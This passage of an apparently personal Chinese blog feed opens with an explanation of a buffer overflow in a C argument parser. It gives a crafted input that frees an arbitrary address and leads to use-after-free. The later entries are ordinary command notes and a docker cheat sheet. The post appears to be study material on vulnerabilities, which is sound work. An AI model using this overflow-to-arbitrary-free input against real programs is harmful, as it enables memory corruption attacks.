    bool quote = false;                                                       
    int k;                                                                    

    memset(argv, 0, sizeof(argv));                                            
    memset(tmp, 0, sizeof(tmp));                                              
    while(*p) {                                                               
        ...  

        *q = *p++; 
        //参数截取分支                                                          
        if (!quote &amp;&amp; *q == ' ') {                                           
            *q = '\0';                                                       
            argv[argc++] = strdup(tmp);                                      
            memset(tmp, 0, sizeof(tmp));                                     
            q = tmp;                                                         
            continue;                                                        
        }                                                                    
        q++;                                                                 
    }                                                                        

    argv[argc++] = strdup(tmp);                                              
    ....                                                                           
    int j;                                                                   
    for (j = 0; j &lt; argc; j++)                                               
        free(argv[j]);                                                       
    return;
} 
</code></pre>
<p>需要关注一点，字符指针数组argv是存在缓冲区溢出的，长度是16。</p>
<p>构造输入 <code>cmd p1 p2 p3 p4 p5 p6 p7 p8 p9 p10 p11 p12 p13 p14 p15 p16 \x78\x56\x34\x12</code> 可以实现free掉 <code>0x12345678</code>处的内存</p>
<p>利用溢出free任意地址是如何实现的呢，关键就是从argv溢出到tmp</p>
<p>在循环不断存入p15之后，argv已经满了，之后读入p16，会将p16的指针存入tmp[0] - tmp[3]，之后继续读入我们构造的地址</p>
<p>首先，会将地址存入tmp中，会覆盖掉tmp[0] - tmp[3]，也就是将argv[16]存放的指针地址给覆盖掉了，之后再将此块数据申请一块内存，把指针给argv[17],其实也是tmp的tmp[4] - tmp[7]</p>
<p>之后循环free的时候，在free[argv[16]]的时候就会free掉我们写入的特定地址<br>
<img src="https://rainerhu.github.io/post-images/1687092682484.png" alt="" loading="lazy"><br>
之后再次调用这个函数，执行到strdup(tmp)的时候就可以分配一块可控制大小的内存，可以将刚才free掉的内存分配到，然后对这块内存进行写入数据。进行后续的利用</p>
<h3 id="小结">小结</h3>
<ul>
<li>存在有指针在释放后还会被继续使用的逻辑</li>
<li>可以控制free掉任意指针的内存，然后再申请该内存，写入数据</li>
</ul>
<p>两种情况都会导致UAF，第二种会比较少见也更加隐蔽，一般需要其他漏洞才能做到</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[命令记录]]></title>
        <id>https://rainerhu.github.io/post/ming-ling-ji-lu/</id>
        <link href="https://rainerhu.github.io/post/ming-ling-ji-lu/">
        </link>
        <updated>2017-11-23T09:27:57.000Z</updated>
        <content type="html"><![CDATA[<h1 id="树莓派">树莓派</h1>
<ul>
<li>查看温度</li>
</ul>
<pre><code>vcgencmd measure_temp 
</code></pre>
<h1 id="centos">centos</h1>
<h2 id="重启网络">重启网络</h2>
<pre><code>service network restart
</code></pre>
<h2 id="screen">screen</h2>
<h3 id="常用命令">常用命令:</h3>
<pre><code>screen -S name #创建一个名字为name的会话
screen -r name #恢复到离开前创建的name会话的工作界面
screen -ls screen #会列出当前存在的会话列表
exit #会提示：[screen is terminating]，表示已经成功退出screen会话
</code></pre>
<h3 id="远程演示">远程演示</h3>
<p>首先演示者先在服务器上执行<br>
<code>screen -S test</code> 创建一个screen会话，<br>
观众可以链接到远程服务器上执行<code>screen -x test</code> 观众屏幕上就会出现和演示者同步。</p>
<h1 id="cmder">cmder</h1>
<p>利用Tab，自动路径补全；<br>
利用Ctrl+T建立新页签；利用Ctrl+W关闭页签;<br>
利用Ctrl+Tab切换页签;<br>
Alt+F4：关闭所有页签<br>
Alt+Shift+1：开启cmd.exe<br>
Alt+Shift+2：开启powershell.exe<br>
Alt+Shift+3：开启powershell.exe (系统管理员权限)<br>
Ctrl+1：快速切换到第1个页签<br>
Ctrl+n：快速切换到第n个页签( n值无上限)<br>
Alt + enter： 切换到全屏状态；<br>
Ctr+r 历史命令搜索</p>
<h1 id="git-代理">git 代理</h1>
<pre><code>git config --global --unset http.proxy
git config --global --unset https.proxy
git config --global http.proxy 'socks5://127.0.0.1:1086'   
git config --global https.proxy 'socks5://127.0.0.1:1086'
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[docker常用命令记录]]></title>
        <id>https://rainerhu.github.io/post/docker-chang-yong-ming-ling-ji-lu/</id>
        <link href="https://rainerhu.github.io/post/docker-chang-yong-ming-ling-ji-lu/">
        </link>
        <updated>2017-11-16T09:31:35.000Z</updated>
        <summary type="html"><![CDATA[<h1 id="基础类">基础类</h1>
<h2 id="查看docker信息">查看docker信息</h2>
<pre><code># 查看docker版本
docker version
# 显示docker系统的信息
docker info
# 日志信息
docker logs
# 故障检查
service  docker  status
# 启动关闭docker
sudo service docker start|stop
</code></pre>
]]></summary>
        <content type="html"><![CDATA[<h1 id="基础类">基础类</h1>
<h2 id="查看docker信息">查看docker信息</h2>
<pre><code># 查看docker版本
docker version
# 显示docker系统的信息
docker info
# 日志信息
docker logs
# 故障检查
service  docker  status
# 启动关闭docker
sudo service docker start|stop
</code></pre>
<!-- more -->
<h1 id="日志类">日志类</h1>
<h2 id="查看容器日志">查看容器日志</h2>
<pre><code>docker logs -f &lt;容器名orID&gt;
</code></pre>
<h2 id="docker-daemon-日志位置">docker daemon 日志位置</h2>
<p>根据系统不同各不相同</p>
<pre><code>* Ubuntu - /var/log/upstart/docker.log
* Boot2Docker - /var/log/docker.log
* Debian GNU/Linux - /var/log/daemon.log
* CentOS - /var/log/daemon.log | grep docker
* Fedora - journalctl -u docker.service
* Red Hat Enterprise Linux Server - /var/log/messages | grep docker
</code></pre>
<h2 id="docker-ps没有响应-日志查询">docker ps没有响应 日志查询</h2>
<pre><code># grep 所有容器的config.json
docker logs [conID]
# 确认问题后
# 该config.json 中有该容器1号进程的pid
kill -9 pid
</code></pre>
<h1 id="容器类">容器类</h1>
<p>docker容器可以理解为在沙盒中运行的进程。</p>
<blockquote>
<p>这个沙盒包含了该进程运行所必须的资源，包括文件系统、系统类库、shell 环境等等。但这个沙盒默认是不会运行任何程序的。你需要在沙盒中运行一个进程来启动某一个容器。这个进程是该容器的唯一进程，所以当该进程结束的时候，容器也会完全的停止。</p>
</blockquote>
<h2 id="查看容器信息">查看容器信息</h2>
<pre><code># 查看当前运行的容器
docker ps
# 查看全部容器
docker ps -a
# 查看全部容器的id和信息
docker ps -a -q
# 查看一个正在运行容器进程，支持 ps 命令参数
docker top
# 查看容器的示例id
sudo docker inspect -f  '{{.Id}}' [id]
# 检查镜像或者容器的参数，默认返回 JSON 格式
docker inspect
# 返回 ubuntu:14.04  镜像的 docker 版本
docker inspect --format '{{.DockerVersion}}' ubuntu:14.04
</code></pre>
<h2 id="容器同步命令">容器同步命令</h2>
<pre><code># 保存对容器的修改
docker commit
# 对比容器的改动
docker diff
# 附加到一个运行的容器上
docker attach
</code></pre>
<h2 id="容器操作命令">容器操作命令</h2>
<h3 id="创建删除容器">创建删除容器</h3>
<pre><code># 创建一个容器命名为 test 使用镜像daocloud.io/library/ubuntu
docker create -it --name test daocloud.io/library/ubuntu
# 创建并启动一个容器 名为 test 使用镜像daocloud.io/library/ubuntu
docker run --name test daocloud.io/library/ubuntu
# 删除一个容器
docker rm [容器id]
# 删除所有容器
docker rm `docker ps -a -q`
# 根据Dockerfile 构建
docker build -t [image_name] [Dockerfile_path]
</code></pre>
<h3 id="docker容器随系统自启">docker容器随系统自启</h3>
<pre><code>docker run --restart=always
</code></pre>
<ul>
<li>no – 默认值，如果容器挂掉不自动重启</li>
<li>on-failure – 当容器以非 0 码退出时重启容器,同时可接受一个可选的最大重启次数参数 (e.g. on-failure:10).</li>
<li>always – 不管退出码是多少都要重启</li>
</ul>
<h3 id="容器资源限制参数">容器资源限制参数</h3>
<pre><code># 限制内存最大使用
-m 1024m --memory-swap=1024m
# 限制容器使用CPU
--cpuset-cpus=&quot;0,1&quot;
</code></pre>
<h3 id="把一个正在运行的容器保存为镜像">把一个正在运行的容器保存为镜像</h3>
<pre><code>docker commit &lt;CONTAIN-ID&gt; &lt;IMAGE-NAME&gt;
</code></pre>
<h3 id="启动停止容器等操作">启动停止容器等操作</h3>
<pre><code>docker start|stop|restart [id]
# 暂停|恢复 某一容器的所有进程
docker pause|unpause [id]
# 杀死一个或多个指定容器进程
docker kill -s KILL [id]
# 停止全部运行的容器
docker stop `docker ps -q`
# 杀掉全部运行的容器
docker kill -s KILL `docker ps -q`
</code></pre>
<h3 id="交互式进入容器">交互式进入容器</h3>
<pre><code>sudo docker exec -it {{containerName or containerID}} bash
</code></pre>
<h3 id="查看容器的root用户密码">查看容器的root用户密码</h3>
<pre><code>docker logs &lt;容器名orID&gt; 2&gt;&amp;1 | grep '^User: ' | tail -n1
</code></pre>
<p>因为Docker容器启动时的root用户的密码是随机分配的。所以，通过这种方式就可以得到容器的root用户的密码了</p>
<h3 id="容器于宿主拷贝文件">容器于宿主拷贝文件</h3>
<pre><code>docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-
docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH
# 本地文件上传到对应容器的目录
docker cp local.sh [CONTAINERid]:[TagPath]
</code></pre>
<p>此命令为高版本docker才有，当然1.11+肯定包含</p>
<h3 id="运行一个新容器同时为它命名-端口映射-文件夹映射">运行一个新容器，同时为它命名、端口映射、文件夹映射</h3>
<p>以<code>redmine</code>镜像为例</p>
<pre><code>docker run --name redmine -p 9003:80 -p 9023:22 -d -v /var/redmine/files:/redmine/files -v /var/redmine/mysql:/var/lib/mysql sameersbn/redmine
</code></pre>
<h3 id="一个容器连接到另一个容器">一个容器连接到另一个容器</h3>
<pre><code>docker run -i -t --name sonar -d -link mmysql:db  tpires/sonar-server sonar
</code></pre>
<h3 id="导入导出容器">导入导出容器</h3>
<pre><code># 支持远程文件 .tar, .tar.gz, .tgz, .bzip, .tar.xz, .txz
docker import
# 导出
docker export [id] &gt;~/Downloads/ubuntu_nexus.tar
导出后导入（exported-imported)）的容器会丢失所有的提交历史，无法回滚。
</code></pre>
<h1 id="镜像操作">镜像操作</h1>
<h2 id="远程镜像">远程镜像</h2>
<pre><code>docker login
</code></pre>
<pre><code>docker search
# 搜索处收藏数不小于 3 ，并且能够自动化构建的  django 镜像，并且完整显示镜像描述
docker search -s 3 --automated --no-trunc django
docker pull
# 拉取ubuntu最新的镜像
docker pull ubuntu:latest
# 服务器拉取个人动态，可选择时间区间
docker events
# 拉取个人从 2015/07/20 到 2015/08/08 的个人动态
docker events --since=&quot;20150720&quot; --until=&quot;20150808&quot;
</code></pre>
<h2 id="镜像同步操作">镜像同步操作</h2>
<pre><code># 标记本地镜像，将其归入某一仓库
docker tag
# 将 ID 为 5db5f84x1261 的容器标记为 mine/lnmp:0.2 镜像
docker tag 5db5f84x1261 mine/lnmp:0.2
# 将镜像推送至远程仓库，默认为 Docker Hub
docker push
本地镜像

# 列出本地所有镜像
docker images
# 本地镜像名为 ubuntu 的所有镜像
docker images ubuntu
# 查看指定镜像的创建历史
docker history [id]
# 本地移除一个或多个指定的镜像
docker rmi
# 移除本地全部镜像
docker rmi `docker images -a -q`
# 指定镜像保存成 tar 归档文件， docker load 的逆操作
docker save
# 将镜像 ubuntu:14.04 保存为 ubuntu14.04.tar 文件
docker save -o ubuntu14.04.tar ubuntu:14.04
# 从 tar 镜像归档中载入镜像， docker save 的逆操作
docker load
# 上面命令的意思是将 ubuntu14.04.tar 文件载入镜像中
docker load -i ubuntu14.04.tar
docker load &lt; /home/save.tar
# 构建自己的镜像
docker build -t &lt;镜像名&gt; &lt;Dockerfile路径&gt;
docker build -t xx/gitlab .
</code></pre>
<blockquote>
<p>保存后再加载（saved-loaded）的镜像不会丢失提交历史和层，可以回滚</p>
</blockquote>
<h2 id="重新查看container的stdout">重新查看container的stdout</h2>
<pre><code># 启动top命令，后台运行
$ ID=$(sudo docker run -d ubuntu /usr/bin/top -b)
# 获取正在running的container的输出
$ sudo docker attach $ID
top - 02:05:52 up  3:05,  0 users,  load average: 0.01, 0.02, 0.05
Tasks:  1 total,  1 running,  0 sleeping,  0 stopped,  0 zombie
Cpu(s):  0.1%us,  0.2%sy,  0.0%ni, 99.7%id,  0.0%wa,  0.0%hi,  0.0%si,  0.0%st
Mem:    373572k total,  355560k used,    18012k free,    27872k buffers
Swap:  786428k total,        0k used,  786428k free,  221740k cached
^C$
$ sudo docker stop $ID
</code></pre>
<h1 id="docker-run">docker run</h1>
<h2 id="后台运行-d-并暴露端口">后台运行(-d)、并暴露端口</h2>
<p>如果想要其他主机访问,不能使用<code>127.0.0.1</code>需要使用<code>0.0.0.0</code>作为ip地址<br>
<code>127.0.0.1</code>仅能主机访问,是回环地址</p>
<pre><code>docker run -d -p 127.0.0.1:33301:22 centos6-ssh
</code></pre>
<h2 id="run-命令详解">run 命令详解</h2>
<pre><code>-a, --attach=[]            Attach to STDIN, STDOUT or STDERR 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项
  --add-host=[]              Add a custom host-to-IP mapping (host:ip)
  --blkio-weight=0            Block IO (relative weight), between 10 and 1000
  -c, --cpu-shares=0          CPU shares (relative weight)
  --cap-add=[]                Add Linux capabilities
  --cap-drop=[]              Drop Linux capabilities
  --cgroup-parent=            Optional parent cgroup for the container
  --cidfile=                  Write the container ID to the file
  --cpu-period=0              Limit CPU CFS (Completely Fair Scheduler) period
  --cpu-quota=0              Limit the CPU CFS quota
  --cpuset-cpus=              CPUs in which to allow execution (0-3, 0,1) 绑定容器到指定CPU运行
  --cpuset-mems=              MEMs in which to allow execution (0-3, 0,1) 绑定容器到指定MEM运行
  -d, --detach=false          Run container in background and print container ID 后台运行容器，并返回容器ID
  --device=[]                Add a host device to the container
  --dns=[]                    Set custom DNS servers 指定容器使用的DNS服务器，默认和宿主一致
  --dns-search=[]            Set custom DNS search domains 指定容器DNS搜索域名，默认和宿主一致
  -e, --env=[]                Set environment variables 设置环境变量
  --entrypoint=              Overwrite the default ENTRYPOINT of the image
  --env-file=[]              Read in a file of environment variables 从指定文件读入环境变量
  --expose=[]                Expose a port or a range of ports
  -h, --hostname=            Container host name 指定容器的hostname
  --help=false                Print usage
  -i, --interactive=false    Keep STDIN open even if not attached 以交互模式运行容器，通常与 -t 同时使用
  --ipc=                      IPC namespace to use
  -l, --label=[]              Set meta data on a container
  --label-file=[]            Read in a line delimited file of labels
  --link=[]                  Add link to another container
  --log-driver=              Logging driver for container
  --log-opt=[]                Log driver options
  --lxc-conf=[]              Add custom lxc options
  -m, --memory=              Memory limit
  --mac-address=              Container MAC address (e.g. 92:d0:c6:0a:29:33)
  --memory-swap=              Total memory (memory + swap), '-1' to disable swap
  --name=                    Assign a name to the container 为容器指定一个名称
  --net=bridge                Set the Network mode for the container  指定容器的网络连接类型，支持 bridge/host/none/container:&lt;name|id&gt; 四种类型
  --oom-kill-disable=false    Disable OOM Killer
  -P, --publish-all=false    Publish all exposed ports to random ports
  -p, --publish=[]            Publish a container's port(s) to the host
  --pid=                      PID namespace to use
  --privileged=false          Give extended privileges to this container
  --read-only=false          Mount the container's root filesystem as read only
  --restart=no                Restart policy to apply when a container exits
  --rm=false                  Automatically remove the container when it exits
  --security-opt=[]          Security Options
  --sig-proxy=true            Proxy received signals to the process
  -t, --tty=false            Allocate a pseudo-TTY 为容器重新分配一个伪输入终端，通常与 -i 同时使用
  -u, --user=                Username or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;])
  --ulimit=[]                Ulimit options
  --uts=                      UTS namespace to use
  -v, --volume=[]            Bind mount a volume
  --volumes-from=[]          Mount volumes from the specified container(s)
  -w, --workdir=              Working directory inside the container
</code></pre>
<h1 id="存在的问题解决方法">存在的问题解决方法</h1>
<h2 id="ubuntu14下的docker是没有service服务">ubuntu14下的docker是没有service服务</h2>
<p>去除每次sudo运行docker命令，需要添加组</p>
<pre><code># Add the docker group if it doesn't already exist.
$ sudo groupadd docker
#改完后需要重新登陆用户
$ sudo gpasswd -a ${USER} docker
</code></pre>
<h2 id="dockerfile中的expose-docker-run-expose-docker-run-p之间的区别">Dockerfile中的EXPOSE、docker run --expose、docker run -p之间的区别</h2>
<ul>
<li>Dockerfile的EXPOSE相当于docker run --expose，提供container之间的端口访问</li>
<li>docker run -p允许container外部主机访问container的端口</li>
</ul>
<h2 id="ubuntu14的febootstrap没有-i命令">ubuntu14的febootstrap没有-i命令</h2>
<p>作者：泛原罪<br>
链接：<a href="http://www.jianshu.com/p/adaa34795e64">http://www.jianshu.com/p/adaa34795e64</a><br>
來源：简书</p>
]]></content>
    </entry>
</feed>